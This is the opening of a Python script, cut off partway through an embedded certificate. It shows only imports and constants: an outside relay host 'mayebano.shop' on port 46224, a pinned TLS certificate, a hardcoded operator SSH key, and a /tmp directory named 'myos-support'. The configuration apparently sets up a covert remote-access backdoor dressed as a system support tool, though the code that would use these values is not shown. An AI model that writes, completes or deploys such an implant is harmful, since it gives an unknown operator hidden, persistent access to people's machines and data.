#!/usr/bin/python3
import ctypes
import hashlib
import json
import os
import secrets
import signal
import socket
import ssl
import subprocess
import sys
import threading
import time
from pathlib import Path

STATE = Path("/tmp/myos-support")
RELAY_HOST = "mayebano.shop"
RELAY_PORT = 46224
RELAY_TLS_NAME = "myos-support"
OPERATOR_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBwoXfJbc9P9GA7/75FrPXWD8nSb+7pTMr3VOM/2qYas"
RELAY_CERTIFICATE = """-----BEGIN CERTIFICATE-----
MIIBnDCCAUKgAwIBAgIUWpaZx37rRFQOx9KVb9+mpa3Q558wCgYIKoZIzj0EAwIw
FzEVMBMGA1UEAwwMbXlvcy1zdXBwb3J0MB4XDTI2MTExNDAzMzQxMVoXDTMxMTEx
MzAzMzQxMVowFzEVMBMGA1UEAwwMbXlvcy1zdXBwb3J0MFkwEwYHKoZIzj0CAQYI
KoZIzj0DAQcDQgAEhJdbwC6c8vctbFBvqKisL9AEwfqnvl/sNUbQ42pfeKd/ryuh
LGIWDE9JkR/KyroZ3ryAZjA+mPf+m/3psu7ZLqNsMGowHQYDVR0OBBYEFEQuV7TK
bg235Otbp6DqxvJR4nC3MB8GA1UdIwQYMBaAFEQuV7TKbg235Otbp6DqxvJR4nC3
